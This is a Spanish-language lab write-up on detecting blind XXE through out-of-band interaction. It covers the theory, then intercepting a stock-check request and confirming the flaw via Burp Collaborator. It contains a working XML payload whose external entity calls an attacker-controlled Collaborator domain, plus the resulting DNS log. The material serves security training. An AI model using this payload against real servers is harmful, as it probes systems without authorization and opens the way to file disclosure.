# 3. XXE Blind con Interacción OOB

## 🗄️ XXE ciego con interacción out-of-band

### 📄 Descripción del laboratorio

Este laboratorio utiliza nuevamente la funcionalidad **Check stock**, que envía un documento **XML** al servidor.

A diferencia de otros casos de XXE, el servidor **no devuelve ningún dato procesado en la respuesta**:

* No hay mensajes de error.
* No hay datos reflejados.
* La respuesta siempre es la misma.

Esto corresponde a un escenario de **Blind XXE (XXE ciega)**.

El objetivo es:

* Confirmar la vulnerabilidad XXE.
* Provocar una **interacción fuera de banda (Out-of-Band / OOB)**.
* Detectar la interacción mediante **Burp Collaborator**.

***

### 📚 Teoría

En una vulnerabilidad **XXE clásica**:

1. El servidor procesa el XML.
2. Resuelve la entidad externa.
3. Inserta el resultado en la respuesta HTTP.

Esto permite al atacante leer directamente archivos o recursos.

En una **XXE ciega**, el comportamiento es diferente:

* El parser XML **sí resuelve la entidad externa**.
* Pero **el resultado no se refleja en la respuesta**.

Esto impide confirmar la vulnerabilidad observando únicamente la respuesta de la aplicación.

#### 📌 Confirmación mediante efectos secundarios

Para detectar una XXE ciega se utilizan **interacciones fuera de banda (OOB)**.

La idea consiste en provocar que el servidor realice una conexión externa hacia un dominio controlado por el atacante.

Las interacciones típicas son:

* Resoluciones **DNS**
* Peticiones **HTTP/HTTPS**

Si el servidor intenta conectarse a ese dominio, podemos confirmar que:

* El parser XML resolvió la entidad externa.
* Existe una vulnerabilidad XXE explotable.

#### 📌 Burp Collaborator

**Burp Collaborator** permite detectar estas interacciones.

Proporciona:

* Subdominios únicos.
* Registro de peticiones DNS y HTTP.
* Identificación del origen de la conexión.

Esto permite confirmar vulnerabilidades incluso cuando la aplicación **no devuelve ningún feedback visible**.

***

### 📝 Práctica

#### 🎯 Objetivo

Detectar una **XXE ciega** provocando una interacción DNS o HTTP hacia **Burp Collaborator**.

***

#### 1️⃣ Preparar Burp Collaborator

Abrimos Burp Suite y accedemos a:

```
Burp → Burp Collaborator client
```

Pulsamos **Copy to clipboard** para generar un dominio único, por ejemplo:

```
1fha17wbnjuoufx9ye5fu740oruii86x.oastify.com
```

Burp monitorizará cualquier interacción con ese dominio.

***

#### 2️⃣ Interceptar la petición vulnerable

Accedemos a la aplicación y pulsamos **Check stock** en cualquier producto.

Interceptamos la petición **POST** con Burp y observamos el XML original:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Enviamos la petición al **Repeater**.

<figure><img src="../../../.gitbook/assets/image (468).png" alt=""><figcaption></figcaption></figure>

Probamos modificar los valores del XML y observamos que:

* La respuesta siempre es la misma.
* No hay reflexión de datos.
* No hay errores.

Esto indica que probablemente estamos ante una **XXE ciega**.

***

#### 3️⃣ Inyectar una entidad externa OOB

Modificamos la petición añadiendo un **DOCTYPE** con una entidad externa apuntando a nuestro dominio de Collaborator.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "https://1fha17wbnjuoufx9ye5fu740oruii86x.oastify.com">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Enviamos la petición.

<figure><img src="../../../.gitbook/assets/image (469).png" alt=""><figcaption></figcaption></figure>

La respuesta del servidor no cambia y sigue siendo genérica.

Esto es esperado en una **XXE ciega**.

***

#### 4️⃣ Confirmar la interacción fuera de banda

Volvemos a **Burp Collaborator client** y pulsamos:

```
Poll now
```

Tras unos segundos aparecen interacciones registradas, por ejemplo:

```
DNS interaction from <server-ip> for 1fha17wbnjuoufx9ye5fu740oruii86x.oastify.com
```

<figure><img src="../../../.gitbook/assets/image (470).png" alt=""><figcaption></figcaption></figure>

Esto confirma que el servidor:

* Procesó el XML.
* Resolvió la entidad externa.
* Intentó conectarse al dominio controlado.

***

#### 5️⃣ Resultado final

Se consigue:

* Detectar una **XXE ciega**.
* Provocar una interacción **DNS/HTTP fuera de banda**.
* Confirmar que el parser XML resuelve entidades externas.
* Demostrar que el servidor puede realizar **conexiones salientes**.

El laboratorio queda resuelto correctamente.
